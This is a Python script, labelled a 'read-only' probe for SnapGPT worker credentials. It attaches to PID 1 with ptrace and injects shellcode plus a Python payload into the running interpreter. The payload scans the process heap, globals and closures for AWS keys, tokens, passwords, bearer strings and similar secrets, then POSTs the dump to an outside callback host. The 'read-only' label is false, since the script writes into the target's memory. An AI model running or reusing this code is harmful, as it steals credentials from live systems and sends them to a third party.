#!/usr/bin/env python3
"""Read-only PID-1 object graph probe for SnapGPT worker credentials."""
import ctypes, gzip, hashlib, json, os, pathlib, re, struct, time, urllib.request
PID=1
OUT=pathlib.Path('/tmp/workspace/p1objgraph.json')
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-p1objgraph-20261106'
PTRACE_PEEKTEXT=1; PTRACE_POKEDATA=5; PTRACE_CONT=7; PTRACE_GETREGS=12; PTRACE_SETREGS=13; PTRACE_ATTACH=16; PTRACE_DETACH=17
class Regs(ctypes.Structure):
    _fields_=[(x,ctypes.c_ulonglong) for x in 'r15 r14 r13 r12 rbp rbx r11 r10 r9 r8 rax rcx rdx rsi rdi orig_rax rip cs eflags rsp ss fs_base gs_base ds es fs gs'.split()]
class DlInfo(ctypes.Structure):
    _fields_=[('dli_fname',ctypes.c_char_p),('dli_fbase',ctypes.c_void_p),('dli_sname',ctypes.c_char_p),('dli_saddr',ctypes.c_void_p)]
C=ctypes.CDLL(None,use_errno=True)
C.ptrace.restype=ctypes.c_long; C.ptrace.argtypes=[ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p]
C.waitpid.restype=ctypes.c_int; C.waitpid.argtypes=[ctypes.c_int,ctypes.POINTER(ctypes.c_int),ctypes.c_int]
C.dladdr.restype=ctypes.c_int; C.dladdr.argtypes=[ctypes.c_void_p,ctypes.POINTER(DlInfo)]
def pt(req,a=0,d=0):
 r=C.ptrace(req,PID,ctypes.c_void_p(a),ctypes.c_void_p(d))
 if r==-1:
  e=ctypes.get_errno()
  if e: raise OSError(e,os.strerror(e))
 return r
def wait():
 st=ctypes.c_int(); C.waitpid(PID,ctypes.byref(st),0); return st.value
def peek(a): return pt(PTRACE_PEEKTEXT,a,0)&((1<<64)-1)
def poke(a,w): pt(PTRACE_POKEDATA,a,w&((1<<64)-1))
def write(a,b):
 b+=b'\0'+b'\0'*((-(len(b)+1))%8)
 for i in range(0,len(b),8): poke(a+i,struct.unpack('<Q',b[i:i+8])[0])
def maps():
 out=[]
 for l in pathlib.Path('/proc/1/maps').read_text().splitlines():
  p=l.split();
  if len(p)<6: continue
  lo,hi=(int(x,16) for x in p[0].split('-'))
  out.append((lo,hi,p[1],int(p[2],16),p[5]))
 return out
def sym(name):
 fn=getattr(ctypes.CDLL(None),name); info=DlInfo()
 if not C.dladdr(ctypes.cast(fn,ctypes.c_void_p),ctypes.byref(info)): raise RuntimeError('dladdr '+name)
 off=ctypes.cast(fn,ctypes.c_void_p).value-info.dli_fbase
 for lo,hi,perm,fo,path in maps():
  if path.endswith('libpython3.12.so.1.0') and 'x' in perm:
   a=lo-fo+off
   if lo<=a<hi:return a
 raise RuntimeError('symbol mapping '+name)
def stack():
 for lo,hi,perm,fo,path in maps():
  if path=='[stack]':return lo,hi
 raise RuntimeError('stack')
def trampoline(code_addr,ensure,run,release,result,msg):
 s=bytearray(); s+=b'\x48\xb8'+struct.pack('<Q',ensure)+b'\xff\xd0'+b'\x49\x89\xc4'
 lp=len(s); s+=b'\x48\x8d\x3d\x00\x00\x00\x00'+b'\x31\xf6'
 s+=b'\x48\xb8'+struct.pack('<Q',run)+b'\xff\xd0'+b'\x49\x89\xc5'
 s+=b'\x4c\x89\xe7'+b'\x48\xb8'+struct.pack('<Q',release)+b'\xff\xd0'
 s+=b'\x48\xbb'+struct.pack('<Q',result)+b'\x4c\x89\x23\x4c\x89\x6b\x08\xcc'
 mo=len(s); s[lp+3:lp+7]=struct.pack('<i',mo-(lp+7)); s+=msg+b'\0'; return bytes(s)
payload=r'''
import gc, json, os, pathlib, re, sys, time, traceback
out={"pid":os.getpid(),"ppid":os.getppid(),"uid":os.getuid(),"hostname":os.uname().nodename,
     "utc":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),"modules":{},"module_names":[],
     "strings":[],"dicts":[],"objects":[],"functions":[],"errors":[]}
pat=re.compile(r"(?i)(SNAPGPT|AWS|TOKEN|SECRET|CREDENTIAL|PASSWORD|METASERVE|MONGODB|KUBE|IRSA|ROLE|SERVICE.?ACCOUNT|DISPATCHER|BEDROCK|CLAUDE|SLTOKEN|BEARER|PRIVATE.?KEY|AKIA|ASIA|ARN:aws|HTTP://|HTTPS://)")
def safe(v,limit=4000):
 try:
  if isinstance(v,str): return v[:limit]
  if isinstance(v,(bytes,bytearray)): return bytes(v[:limit]).decode("utf-8","replace")
  if isinstance(v,(int,float,bool,type(None))): return v
  return repr(v)[:limit]
 except Exception as e:return "<repr-error:%s>"%type(e).__name__
def add_unique(arr,obj,key=None):
 if key is None:key=json.dumps(obj,sort_keys=True,ensure_ascii=False,default=str)
 if key not in out.setdefault("_seen",set()):
  out["_seen"].add(key);arr.append(obj)
# Module globals, including values that look like credential config.
for name,m in sorted(sys.modules.items()):
 try:
  if not m or not (name=="__main__" or name.startswith("pygen")):
   continue
  out["module_names"].append(name); vals={}
  for k,v in vars(m).items():
   if k.startswith("__"):continue
   if isinstance(v,(str,bytes,bytearray,int,float,bool,type(None))):
    vals[k]=safe(v)
   elif pat.search(k):
    vals[k]=safe(v)
  out["modules"][name]=vals
 except Exception as e:out["errors"].append("module "+name+": "+repr(e))
# Scan every heap string and dict key, without following arbitrary object graphs.
objs=gc.get_objects()
for o in objs:
 try:
  if isinstance(o,str):
   v=o
   if 4<=len(v)<=4000 and pat.search(v):add_unique(out["strings"],{"type":"str","value":v})
  elif isinstance(o,(bytes,bytearray)):
   v=bytes(o[:4000]).decode("utf-8","replace")
   if 4<=len(v)<=4000 and pat.search(v):add_unique(out["strings"],{"type":type(o).__name__,"value":v})
  elif isinstance(o,dict):
   hits=[]
   for k,v in list(o.items())[:200]:
    ks=safe(k,300); vs=safe(v,3000)
    if isinstance(k,str) and pat.search(k):hits.append({"key":ks,"value":vs})
    elif isinstance(v,str) and pat.search(v) and len(v)<=3000:hits.append({"key":ks,"value":vs})
   if hits:add_unique(out["dicts"],{"type":"dict","len":len(o),"hits":hits[:30]})
  elif callable(o):
   nm=getattr(o,"__name__",None)
   if isinstance(nm,str) and pat.search(nm):
    add_unique(out["functions"],{"name":nm,"module":getattr(o,"__module__",None),"qualname":getattr(o,"__qualname__",None)})
  else:
   d=getattr(o,"__dict__",None)
   if isinstance(d,dict):
    hits=[]
    for k,v in list(d.items())[:100]:
     if isinstance(k,str) and pat.search(k):hits.append({"key":k,"value":safe(v,3000)})
    if hits:add_unique(out["objects"],{"type":type(o).__name__,"module":getattr(o,"__module__",None),"hits":hits[:30]})
 except Exception:pass
# Explicitly inspect closures/globals for selected functions.
for name,m in list(sys.modules.items()):
 try:
  for k,v in vars(m).items():
   if callable(v) and isinstance(getattr(v,"__name__",None),str) and pat.search(v.__name__):
    rec={"module":name,"name":v.__name__,"globals":{},"closure":[]}
    try:
     for gk,gv in vars(v.__globals__).items():
      if isinstance(gv,(str,bytes,int,float,bool,type(None))) and (pat.search(gk) or (isinstance(gv,str) and pat.search(gv))):rec["globals"][gk]=safe(gv)
    except Exception:pass
    try:
     for cell in v.__closure__ or ():
      try:rec["closure"].append(safe(cell.cell_contents))
      except Exception:pass
    except Exception:pass
    if rec["globals"] or rec["closure"]:add_unique(out["functions"],rec)
 except Exception:pass
out.pop("_seen",None)
pathlib.Path("/tmp/workspace/p1objgraph.json").write_text(json.dumps(out,ensure_ascii=False,separators=(",",":")))
'''.encode()
def main():
 res={"schema":"snapgpt.p1objgraph/v1","started_at":time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),"pid":PID,"hostname":os.uname().nodename,"uid":os.getuid(),"errors":[]}
 try:
  ensure=sym('PyGILState_Ensure');run=sym('PyRun_SimpleString');release=sym('PyGILState_Release');code=sym('Py_IsInitialized')
  lo,hi=stack();result=lo+0x7000;ns=(lo+0x9000)&~0xf;sc=trampoline(code,ensure,run,release,result,payload)
  res.update({"code":hex(code),"ensure":hex(ensure),"run":hex(run),"release":hex(release),"payload_bytes":len(payload),"trampoline_bytes":len(sc)})
  pt(PTRACE_ATTACH);res['attach_stop']=wait();r=Regs();pt(PTRACE_GETREGS,0,ctypes.addressof(r));saved=Regs.from_buffer_copy(r)
  words=((len(sc)+7)//8)*8;old=[peek(code+i) for i in range(0,words,8)]
  try:
   write(code,sc);r.rip=code;r.rsp=ns;pt(PTRACE_SETREGS,0,ctypes.addressof(r));pt(PTRACE_CONT);res['run_stop']=wait();res['gilstate']=peek(result);res['pyrun']=peek(result+8)
   b=OUT.read_bytes();res['dump_bytes']=len(b);res['dump_sha256']=hashlib.sha256(b).hexdigest();res['dump_text']=b.decode('utf-8','replace')[:200000]
  finally:
   for i,w in enumerate(old):poke(code+i*8,w)
   pt(PTRACE_SETREGS,0,ctypes.addressof(saved));pt(PTRACE_DETACH)
 except Exception as e:
  res['errors'].append(repr(e));res['trace']=traceback.format_exc()[-5000:]
 res['finished_at']=time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime());raw=json.dumps(res,separators=(',',':')).encode();print(raw.decode())
 try:
  q=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json'})
  with urllib.request.urlopen(q,timeout=60) as x:res['sink_status']=x.status
 except Exception as e:res['errors'].append('sink: '+repr(e))
if __name__=='__main__':main()
